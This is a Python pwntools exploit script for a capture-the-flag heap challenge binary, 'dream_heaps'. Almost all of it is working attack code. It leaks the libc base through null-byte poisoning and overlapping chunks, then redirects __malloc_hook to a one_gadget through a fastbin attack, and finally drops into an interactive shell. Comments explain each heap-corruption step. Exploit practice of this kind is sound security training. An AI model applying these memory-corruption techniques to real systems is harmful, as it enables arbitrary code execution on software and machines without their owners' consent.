#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template dream_heaps
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('dream_heaps')
exe = context.binary = ELF('dream_heaps_patched')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    # if args.GDB:
    #     return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    # else:
    #     return process([exe.path] + argv, *a, **kw)
    p = process([exe.path] + argv, *a, **kw)

    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
directory /opt/glibc/
tbreak main
continue
'''.format(**locals())

index = 0

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

menu_choice = lambda choice: io.sendlineafter(b"Quit\n", str(choice).encode())
wait = lambda t: io.recv(0, timeout=t)

def write(data: bytes, size: int):
    global index
    index += 1
    menu_choice(1)
    io.recvuntil(b"dream?\n")
    io.sendline(str(size).encode())
    io.recvuntil(b"dream?\n")
    io.sendline(data)

def read(idx: int) -> bytes:
    menu_choice(2)
    io.recvuntil(b"read?\n")
    io.sendline(str(idx).encode())
    res = io.recvuntil(b"What would you like to do?", drop=True)

    return res

def edit(idx: int, data: bytes):
    menu_choice(3)
    io.recvuntil(b"change?\n")
    io.sendline(str(idx).encode())
    wait(0.5)
    io.sendline(data)

def delete(idx: int):
    menu_choice(4)
    io.recvuntil(b"delete?\n")
    io.sendline(str(idx).encode())

def quit():
    menu_choice(5)

################################################################################
# STAGES
################################################################################

# LEAK LIBC

# array indexing method
def leak_libc():
    offset = 0x3ebc0a

    write(b"A", 0x480)
    write(b"BBBB", 0x20)
    delete(0)
    write(b"", 0x480)
    leak = read(2).ljust(8, b"\x00")
    leak = u64(leak)

    libc.address = leak - offset
    log.info(f"Got libc base address: {hex(libc.address)}")

# heap exploitation method
def heap_leak_libc():
    offset = 0x3c4b78
    size_a = 0xf8 # tcache-able, not fastbinable
    size_b = 0x68 # tcache-able
    size_c = 0x08 # this will prevent consolidation

    write(b"A"*size_a, size_a) # 0
    write(b"B"*size_b, size_b) # 1
    write(b"C"*size_a, size_a) # 2
    write(b"D"*size_c, size_c) # 3

    log.info("4 chunks created")

    delete(0) # this will free first of two 0x100 chunks

    edit(1, b"B"*0x60 + p64(0x170)) # this should overwrite prev_size and prev_in_use bytes
    # this will attempt to read prev_size because prev_in_use is now set to 0x00
    # as prev_size was manually set to 0x170 which is size_a + size_b
    # the consolidation will merge chunks 0, 1 and 2 into one of size 0x270
    # and consolidated chunk will land in unsortedbins
    delete(2)
    log.info("null-byte poisoning done...")

    # now we will take first 0 chunk of size 0x100 back so the FD and BK pointers will now be
    # moved to the chunk that stayed in unsortedbins - chunk 1
    # that chunk is still not freed so I have a pointer to it and I can read data from it
    write(b"E", size_a)
    leak = read(1).ljust(8, b"\x00")
    leak = u64(leak)
    libc.address = leak - offset
    log.success(f"Got libc base address: {hex(libc.address)}")

def overwrite_malloc_hook():
    # put chunk before chunk 1 back to consolidated chunk
    delete(4)
    # get chunk to write correct size of chunk 1 back again
    write(b"F"*0xf8 + p64(0x70), 0x100)
    # now we can free() the chunk to fastbins
    delete(1)
    # that chunk will land in unsortedbins
    delete(5)
    # pwndbg> x/10xg 0x00007f1be7d02b10-0x23
    # 0x7f1be7d02aed:   0x1be7d01260000000      0x000000000000007f <-- pseudo-chunk header with size 0x70
    # 0x7f1be7d02afd:   0x1be79c3ea0000000      0x1be79c3a7000007f
    # 0x7f1be7d02b0d:   0x000000000000007f      0x0000000000000000
    # 0x7f1be7d02b1d:   0x0000000000000000      0x0000000000000000
    # 0x7f1be7d02b2d:   0x0000000000000000      0x0000000000000000
    hook_pseudo_chunk = libc.sym["__malloc_hook"] - 0x23
    write(b"G"*0xf8 + p64(0x70) + p64(hook_pseudo_chunk), 0x108)
    # this will write FD pointer (__malloc_hook - 0x23) to fastbins
    write(b"H", 0x68)
    # that allocation takes address of __malloc_hook - 0x13 from fastbins
    one_gadgets = [ 0x45226, 0x4527a, 0xf0364, 0xf1207 ]
    one_gadget = libc.address + one_gadgets[int(args.O1) if args.O1 else 3]
    write(b"I"*0x13 + p64(one_gadget), 0x68)

# CHUNK OVERLAP
def chunk_overlap():
    heap_leak_libc()
    overwrite_malloc_hook()

    # last malloc to invoke __malloc_hook
    menu_choice(1)
    io.recvuntil(b"dream?\n")
    io.sendline(str(0x1).encode())

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

################################################################################
# ARRAY INDEXING EXPLOITATION TECHNIQUE
################################################################################
# here is the important thing - both arrays HEAP_PTRS and SIZES are one after another:
# HEAP_PTRS:    0x00602040 - 0x00602078
# SIZES:        0x00602080 - ...
# if I will add enough dreams the pointers will begin to override the SIZES
# leak_libc()

################################################################################
# HEAP EXPLOITATION
################################################################################
# https://devel0pment.de/?p=688

# there is only one vulnerability that will be used to exploit heap - null-byte poisoning

chunk_overlap()

io.interactive()

